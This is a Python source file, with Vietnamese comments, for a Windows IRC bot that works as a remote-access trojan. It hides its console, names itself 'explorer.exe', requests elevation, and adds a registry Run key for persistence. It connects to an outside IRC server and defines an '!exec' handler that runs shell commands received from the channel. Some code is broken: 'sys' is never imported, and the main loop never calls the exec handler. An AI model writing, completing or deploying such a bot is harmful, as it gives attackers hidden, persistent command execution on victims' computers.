import socket
import threading
import time
import subprocess
import winreg  # Thêm dòng này ở đầu
import ctypes
import win32console, win32gui
import ctypes
is_admin = ctypes.windll.shell32.IsUserAnAdmin()
ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, "", None, 1)

window = win32console.GetConsoleWindow()
win32gui.ShowWindow(window, 0)

ctypes.windll.kernel32.SetConsoleTitleW("explorer.exe")


# Thông tin kết nối IRC
SERVER = "irc.df.lth.se"
PORT = 6667
NICK = "CppBot"
USER = "USER CppBot 8 * :I'm a C++ IRC bot"
CHANNEL = "#my_channel"

# Hàm thêm bot vào Registry để tự chạy khi khởi động
def setup_persistence():
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)

        winreg.SetValueEx(key, "CppBot", 0, winreg.REG_SZ, r"C:\Users\YourName\AppData\Roaming\cppbot.exe")
        winreg.CloseKey(key)
        print("[+] Persistence setup complete.")
    except Exception as e:
        print(f"[!] Failed to set persistence: {e}")

def send_line(sock, line):
    sock.send((line + "\r\n").encode())
def handle_command(sock, nickname, message):
    if message.startswith("!exec "):
        command = message[6:]
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            send_line(sock, f"PRIVMSG {CHANNEL} :{result.decode(errors='ignore')[:300]}")
        except Exception as e:
            send_line(sock, f"PRIVMSG {CHANNEL} :Error: {e}")

def ping_sender(sock):
    while True:
        send_line(sock, f"PING :{SERVER}")
        time.sleep(15)

def main():
    sock = socket.socket()
    sock.connect((SERVER, PORT))
    
    send_line(sock, f"NICK {NICK}")
    send_line(sock, USER)
    send_line(sock, f"JOIN {CHANNEL}")

    setup_persistence()  # <--- Gọi hàm này tại đây, sau khi kết nối thành công

    threading.Thread(target=ping_sender, args=(sock,), daemon=True).start()

    while True:
        try:
            data = sock.recv(512).decode(errors="ignore")
            print(data)

            if "PING :" in data:
                pong_msg = "PONG :" + data.split(":")[1]
                send_line(sock, pong_msg)

        except Exception as e:
            print(f"[!] Connection error: {e}")
            break

    sock.close()

if __name__ == "__main__":
    main()
